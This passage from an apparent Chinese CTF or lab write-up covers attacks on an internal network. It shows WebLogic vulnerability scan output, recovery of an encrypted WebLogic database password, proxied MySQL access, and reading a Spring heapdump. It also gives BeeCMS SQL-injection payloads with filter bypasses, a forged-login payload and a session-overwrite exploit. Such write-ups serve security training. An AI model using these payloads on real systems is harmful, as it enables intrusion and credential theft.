+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.25.20.10</span><span class="p">:</span><span class="mi">7001</span>  <span class="n">code</span><span class="p">:</span><span class="mi">404</span> <span class="nb">len</span><span class="p">:</span><span class="mi">1164</span>   <span class="n">title</span><span class="p">:</span><span class="n">Error</span> <span class="mi">404</span><span class="o">--</span><span class="n">Not</span> <span class="n">Found</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">7001</span>   <span class="n">code</span><span class="p">:</span><span class="mi">404</span> <span class="nb">len</span><span class="p">:</span><span class="mi">1164</span>   <span class="n">title</span><span class="p">:</span><span class="n">Error</span> <span class="mi">404</span><span class="o">--</span><span class="n">Not</span> <span class="n">Found</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">7001</span>   <span class="n">code</span><span class="p">:</span><span class="mi">404</span> <span class="nb">len</span><span class="p">:</span><span class="mi">1164</span>   <span class="n">title</span><span class="p">:</span><span class="n">Error</span> <span class="mi">404</span><span class="o">--</span><span class="n">Not</span> <span class="n">Found</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Redis</span> <span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">6379</span> <span class="n">unauthorized</span> <span class="n">file</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">log</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">InfoScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">7001</span>   <span class="p">[</span><span class="n">weblogic</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">InfoScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.25.20.10</span><span class="p">:</span><span class="mi">7001</span>  <span class="p">[</span><span class="n">weblogic</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">InfoScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.8</span><span class="p">:</span><span class="mi">7001</span>   <span class="p">[</span><span class="n">weblogic</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">InfoScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">7001</span>   <span class="p">[</span><span class="n">weblogic</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Redis</span> <span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">6379</span> <span class="n">unauthorized</span> <span class="n">file</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">log</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">ssrf</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.8</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">ssrf</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">ssrf</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">14750</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.8</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">14750</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">14750</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.25.20.10</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">14750</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.25.20.10</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">ssrf</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2729</span><span class="o">-</span><span class="mi">1</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2729</span><span class="o">-</span><span class="mi">2</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.8</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2729</span><span class="o">-</span><span class="mi">1</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.8</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2729</span><span class="o">-</span><span class="mi">2</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.25.20.10</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2729</span><span class="o">-</span><span class="mi">1</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.25.20.10</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2729</span><span class="o">-</span><span class="mi">2</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2729</span><span class="o">-</span><span class="mi">2</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2729</span><span class="o">-</span><span class="mi">1</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.8</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2725</span> <span class="n">v10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2725</span> <span class="n">v10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2725</span> <span class="n">v10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.25.20.10</span><span class="p">:</span><span class="mi">7001</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">weblogic</span><span class="o">-</span><span class="n">cve</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">2725</span> <span class="n">v10</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>下面的资产是下面的题，这题显然是打<code>172.25.20.12:3306</code>,那显然就是要数据库用户密码</p>
+<p>参考[<a class="link" href="https://www.sohu.com/a/357982530_354899"  target="_blank" rel="noopener"
+    >一文解密所有WebLogic密文_加密</a>](<a class="link" href="https://blog.csdn.net/mashiro_hibiki/article/details/138810444"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/mashiro_hibiki/article/details/138810444</a>)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">weblogic的密文分两类，一类是数据库连接字符串，一类是console登录用户名和密码。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">数据库连接字符串一般是在config/jdbc目录下的**jdbc.xml文件
+</span></span><span class="line"><span class="cl">密钥文件：SerializedSystemIni.dat默认位置：
+</span></span><span class="line"><span class="cl">/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251115210801849.png" alt="image-20251115210801849" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{AES}ZhArsOkXPBA9AvAwRxNxpK4G0WlHlpNFBZVsu+PDlYU=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat ./security/SerializedSystemIni.dat | base64 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251115211913024.png" alt="image-20251115211913024" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BNnQ4ugCIIdQsPqblVIj9ILs/o1Wl+QiTx2coQCBU/wdo4laQlBoGDGGuIqvgnI9KKgiD58oczjY
+</span></span><span class="line"><span class="cl">xfmvNlHH5w==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251115212757484.png" alt="image-20251115212757484" style="zoom:50%;" />
+<p><code>Meetsec#1024</code></p>
+<p>然后stowaway挂上代理</p>
+<img src="image-20251115215014942.png" alt="image-20251115215014942" style="zoom:50%;" />
+<p>用kali挂代理连数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains mysql -h 172.25.20.12 -u root -p --ssl=0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后后输入密码</p>
+<img src="image-20251116184034656.png" alt="image-20251116184034656" style="zoom:50%;" />
+<p>最后在data的table_name表的value里</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116192043603.png"
+	width="635"
+	height="192"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116192043603_hu_c5bb4c780d82b289.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116192043603_hu_c6dbe000c203c533.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251116192043603"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="330"
+		data-flex-basis="793px"
+	
+></p>
+<h2 id="web2-3">web2-3
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT LOAD_FILE(&#39;/flag&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116192304701.png"
+	width="575"
+	height="153"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116192304701_hu_8c9432827f16ee20.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116192304701_hu_b757a5f49e4d90ca.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251116192304701"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="375"
+		data-flex-basis="901px"
+	
+></p>
+<h2 id="web3-1">web3-1
+</h2><p>扫描得敏感文件，然后访问得flag</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114210125405.png"
+	width="807"
+	height="330"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114210125405_hu_69db08464f4fc34.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114210125405_hu_bfd87baa6cb3679c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114210125405"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114210112212.png"
+	width="1824"
+	height="720"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114210112212_hu_e508c47017173c25.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114210112212_hu_c4c65f3c3b6107d0.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114210112212"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="608px"
+	
+></p>
+<h2 id="web3-2">web3-2
+</h2><h3 id="考点heapdump泄露数据库信息">考点：heapdump泄露数据库信息
+</h3><p>发现了/actuator/heapdump，看看有没有什么信息</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115002941883.png"
+	width="677"
+	height="205"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115002941883_hu_8bd185894e754a9e.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115002941883_hu_a49622143b39581a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251115002941883"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="330"
+		data-flex-basis="792px"
+	
+></p>
+<p>解密获得敏感信息</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115152905205.png"
+	width="1331"
+	height="308"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115152905205_hu_332c7d2c9742e558.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115152905205_hu_ca059111c74b1712.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251115152905205"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="432"
+		data-flex-basis="1037px"
+	
+></p>
+<p>navicat连接数据库拿到flag，</p>
+<img src="image-20251115201839000.png" alt="image-20251115201839000" style="zoom:50%;" />
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115201859085.png"
+	width="629"
+	height="232"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115201859085_hu_e019b86249980659.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115201859085_hu_8d54dcdb5ae7ee6c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251115201859085"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="650px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meetsec-web3{flag2-9edbd4b03b5f86a9abe079bc63ea847b}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="web4-1">web4-1
+</h2><h3 id="考点beecms登录页面文件上传rce">考点：beecms登录页面+文件上传rce
+</h3><h3 id="解法一sql报错注入">解法一：sql报错注入
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39; or updatexml(1,concat(0x7e,select database(),0x7e),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114211727711.png"
+	width="1247"
+	height="271"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114211727711_hu_75496735d1b8eff4.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114211727711_hu_b38c8a34b855ff5b.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114211727711"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="460"
+		data-flex-basis="1104px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39; and updatexml(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema=&#39;beecms&#39;,0x7e),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116164836760.png"
+	width="1228"
+	height="272"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116164836760_hu_df099921e5be09a1.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116164836760_hu_d6fac9e61ad18eca.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251116164836760"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="451"
+		data-flex-basis="1083px"
+	
+></p>
+<p>and,where，=，from,select被过滤了，双写+空格绕过(奇怪，前面爆数据库并未过滤)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39; an and d updatexml(1,concat(0x7e,(selselectect group_concat(table_name) fr from om information_schema.tables whe where re table_schema like database()),0x7e),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116165413307.png"
+	width="1201"
+	height="269"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116165413307_hu_ff0e7dd129dd3676.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116165413307_hu_6d81cf82de480fdd.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251116165413307"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="446"
+		data-flex-basis="1071px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39; an and d updatexml(1,concat(0x7e,(selselectect group_concat(column_name) fr from om information_schema.columns whe where re table_name like &#39;bees_admin&#39;),0x7e),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116165758423.png"
+	width="1157"
+	height="274"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116165758423_hu_6dfca3560b53ae33.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116165758423_hu_6a7e7fe3711cac49.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251116165758423"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="422"
+		data-flex-basis="1013px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39; an and d updatexml(1,concat(0x7e,(selselectect group_concat(admin_password) fr from om bees_admin),0x7e),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到md5加密的密码<code>2446d54c2e68d221db9cff653b01a0e</code>,解密后是<code>login123</code></p>
+<h3 id="解法二sql伪造登入">解法二：sql伪造登入
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user=-1&#39;+uniselecton+selselectect+1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,0,0+%23&amp;password=123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>[<a class="link" href="https://blog.csdn.net/shawdow_bug/article/details/127020190"  target="_blank" rel="noopener"
+    >代码审计] beecms 4.0 漏洞总结_bees cms漏洞-CSDN博客</a></p>
+<h3 id="解法三变量覆盖绕过登入">解法三：变量覆盖绕过登入
+</h3><p>还有方法，打变量绕过</p>
+<p><a class="link" href="https://www.freesion.com/article/8527645153/#_130"  target="_blank" rel="noopener"
+    >BeesCMS4.0多处漏洞复现 - 灰信网（软件开发博客聚合）</a></p>
+<p>post提交</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Exp：_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后访问admin/admin.php就行</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114234704976.png"
+	width="1734"
+	height="478"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114234704976_hu_a1a21bae86a5f356.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114234704976_hu_40a19b3c1cbbbade.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114234704976"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="362"
+		data-flex-basis="870px"
+	
+></p>
+<p>然后参考此文</p>
